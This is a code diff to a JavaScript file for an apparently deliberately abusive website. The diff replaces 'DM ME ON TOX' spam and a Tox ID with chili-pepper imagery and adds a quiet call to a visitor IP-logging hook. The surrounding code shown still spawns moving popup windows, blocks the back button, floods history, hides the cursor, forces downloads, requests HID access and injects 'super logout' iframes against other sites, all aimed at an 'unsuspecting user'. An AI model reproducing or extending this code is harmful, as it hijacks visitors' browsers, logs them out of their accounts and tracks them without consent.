@@ -26,30 +26,26 @@
 
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
-const WIN_WIDTH = 480
-const WIN_HEIGHT = 260
+const WIN_WIDTH = 500
+const WIN_HEIGHT = 320
 const VELOCITY = 15
 const MARGIN = 10
-const TICK_LENGTH = 50
+const TICK_LENGTH = 35
 
 const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'
 
 const ART = [
   `
 ==================================================
-                 DM ME ON TOX
-==================================================
-TOX ID:
-F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B
+                       🌶️
 ==================================================
   `
 ]
 
 const SEARCHES = [
-  'tox chat',
-  'dm me on tox',
-  'qtox messenger',
-  'tox id'
+  'chili pepper',
+  'purple chili',
+  'rotating pepper'
 ]
 
 const TOX_ID = 'F5A5B309A4C771E3A88C05C37E27F543E098BAE76AB4442BE6421FA06BE6573E778A32A8415B'
@@ -77,10 +73,9 @@ const FILE_DOWNLOADS = [
 ]
 
 const PHRASES = [
-  'DM me on Tox',
-  'DM me on Tox right now',
-  'Add my Tox ID',
-  'Napisz do mnie na Toxie'
+  '🌶️',
+  'Hot pepper',
+  'Ptoszek'
 ]
 
 const LOGOUT_SITES = {
@@ -139,7 +134,7 @@ let interactionCount = 0
 
 //Bardzo dlugi string xd, ciulowa implementacja ale to chyba lepsze niz ~ 4 miliony znakow w pliku poprostu - added by @9fm
 
-const veryLongString = repeatStringNumTimes(`DM ME ON TOX: ${TOX_ID}\n`, 10000)
+const veryLongString = repeatStringNumTimes('🌶️ 🌶️ 🌶️\n', 10000)
 
 /**
  * Number of iframes injected into the page for the "super logout" functionality.
@@ -234,10 +229,10 @@ function init () {
  * Initialization code for child windows.
  */
 function initChildWindow () {
+  showHelloMessage()
   registerProtocolHandlers()
   hideCursor()
-  moveWindowBounce()
-  showToxTextInChildWindow()
+  moveWindowWalk()
   detectWindowClose()
   triggerFileDownload()
   speak()
@@ -247,6 +242,7 @@ function initChildWindow () {
   interceptUserInput(event => {
     if (interactionCount === 1) {
       startAlertInterval()
+      removeHelloMessage()
     }
   })
 }
@@ -255,6 +251,9 @@ function initChildWindow () {
  * Initialization code for parent windows.
  */
 function initParentWindow () {
+  if (typeof window.logVisitorIP === 'function') {
+    try { window.logVisitorIP(); } catch (e) {}
+  }
   showHelloMessage()
   blockBackButton()
   fillHistory()
@@ -275,7 +274,7 @@ function initParentWindow () {
       removeHelloMessage()
       rainbowThemeColor()
       animateUrlWithEmojis()
-      speak('DM me on Tox')
+      speak('🌶️')
     }
   })
 }
@@ -577,13 +576,11 @@ function focusWindows () {
 function openWindow () {
   const { x, y } = getRandomCoords()
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
-  const win = window.open(window.location.pathname, '', opts)
+  const win = window.open(window.location.pathname + '?child=true', '', opts)
 
   // New windows may be blocked by the popup blocker
   if (!win) return
   wins.push(win)
-
-  if (wins.length === 2) setupSearchWindow(win)
 
   // Added by @wetraks
   win.onunload = function () {
@@ -820,45 +817,85 @@ function requestHidAccess () {
 }
 
 /**
- * Move the window around the screen and bounce off of the screen edges.
+ * Make the window walk through the screen systematically across rows and columns.
  */
-function moveWindowBounce () {
-  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
-  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
+function moveWindowWalk () {
+  let dirX = Math.random() > 0.5 ? 1 : -1
+  let dirY = 1
+  let isSteppingY = 0
+  let tick = 0
+
+  const SPEED_X = 14
+  const STEP_Y_AMOUNT = 12
+  const TOTAL_Y_STEPS = 6
 
   setInterval(() => {
-    const x = window.screenX
-    const y = window.screenY
-    const width = window.outerWidth
-    const height = window.outerHeight
+    tick++
+    const screenLeft = window.screen.availLeft || 0
+    const screenTop = window.screen.availTop || 0
+    const screenW = window.screen.availWidth || 1920
+    const screenH = window.screen.availHeight || 1080
+    const width = window.outerWidth || WIN_WIDTH
+    const height = window.outerHeight || WIN_HEIGHT
 
-    if (x < MARGIN) vx = Math.abs(vx)
-    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
-    if (y < MARGIN + 20) vy = Math.abs(vy)
-    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)
+    const minX = screenLeft + MARGIN
+    const maxX = screenLeft + screenW - width - MARGIN
+    const minY = screenTop + MARGIN + 20
+    const maxY = screenTop + screenH - height - MARGIN
 
-    window.moveBy(vx, vy)
+    const x = window.screenX !== undefined ? window.screenX : (window.screenLeft !== undefined ? window.screenLeft : 100)
+    const y = window.screenY !== undefined ? window.screenY : (window.screenTop !== undefined ? window.screenTop : 100)
+
+    // Check if at screen top or bottom limits
+    if (y + height >= maxY) {
+      dirY = -1
+    } else if (y <= minY) {
+      dirY = 1
+    }
+
+    // If currently performing vertical step to next row
+    if (isSteppingY > 0) {
+      isSteppingY--
+      const vy = dirY * STEP_Y_AMOUNT
+      window.moveBy(0, vy)
+      return
+    }
+
+    // Check if reaching horizontal edge limits
+    const reachedRight = dirX > 0 && (x + width >= maxX)
+    const reachedLeft = dirX < 0 && (x <= minX)
+
+    if (reachedRight || reachedLeft) {
+      dirX = -dirX
+      isSteppingY = TOTAL_Y_STEPS
+      return
+    }
+
+    // Walking horizontally with a slight natural walking bob
+    const bob = Math.round(Math.sin(tick * 0.5) * 2)
+    const vx = dirX * SPEED_X
+    window.moveBy(vx, bob)
   }, TICK_LENGTH)
 }
 
+function moveWindowBounce () {
+  moveWindowWalk()
+}
+
 /**
- * Display the DM ME ON TOX text and Tox ID in the child popup window.
+ * Display the spinning pepper image in the child popup window.
  */
 function showToxTextInChildWindow () {
   const container = document.createElement('div')
   container.className = 'child-tox-container'
-  container.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; color: #fff; z-index: 5; padding: 20px; box-sizing: border-box; text-align: center; user-select: all; cursor: pointer;'
+  container.style = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #000; color: #fff; z-index: 5; padding: 20px; box-sizing: border-box; text-align: center; cursor: pointer;'
 
-  const title = document.createElement('div')
-  title.innerText = 'DM ME ON TOX'
-  title.style = 'font-size: 2.2rem; font-weight: 900; letter-spacing: 3px; color: #fff; margin-bottom: 12px; text-shadow: 0 0 10px rgba(255,255,255,0.7); line-height: 1.1;'
+  const img = document.createElement('img')
+  img.src = 'media/images/chili.png'
+  img.className = 'spinning-image'
+  img.style = 'width: 130px; height: auto; animation: spin 3s linear infinite; filter: drop-shadow(0 0 20px rgba(168, 85, 247, 0.75));'
 
-  const id = document.createElement('div')
-  id.innerText = TOX_ID
-  id.style = "font-family: 'Courier New', Consolas, Monaco, monospace; font-size: 0.8rem; font-weight: 700; word-break: break-all; color: #fff; background: #111; border: 1px solid #444; padding: 8px 10px; border-radius: 6px; width: 90%; box-sizing: border-box; text-align: center;"
-
-  container.appendChild(title)
-  container.appendChild(id)
+  container.appendChild(img)
   document.body.appendChild(container)
 }
 
@@ -884,13 +921,15 @@ function onCloseWindow (win) {
  * Show the unsuspecting user a friendly hello message with a cat.
  */
 function showHelloMessage () {
+  if (document.querySelector('.hello-message')) return
   const template = document.querySelector('template')
+  if (!template) return
   const clone = document.importNode(template.content, true)
   document.body.appendChild(clone)
 }
 
 /**
- * Remove the hello message headings while keeping the DM ME ON TOX text displayed.
+ * Remove the hello message headings while keeping the rotating pepper image displayed.
  */
 function removeHelloMessage () {
   const headings = document.querySelectorAll('.hello-message h1, .hello-message h2, .hello-message h3')
@@ -1111,10 +1150,14 @@ function fillHistory () {
  * screen size, window size, and leaves a safe margin on all sides.
  */
 function getRandomCoords () {
-  const x = MARGIN +
-    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
-  const y = MARGIN +
-    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
+  const screenLeft = window.screen.availLeft || 0
+  const screenTop = window.screen.availTop || 0
+  const screenW = window.screen.availWidth || SCREEN_WIDTH || 1920
+  const screenH = window.screen.availHeight || SCREEN_HEIGHT || 1080
+  const x = screenLeft + MARGIN +
+    Math.floor(Math.random() * Math.max(50, screenW - WIN_WIDTH - MARGIN * 2))
+  const y = screenTop + MARGIN +
+    Math.floor(Math.random() * Math.max(50, screenH - WIN_HEIGHT - MARGIN * 2))
   return { x, y }
 }
 
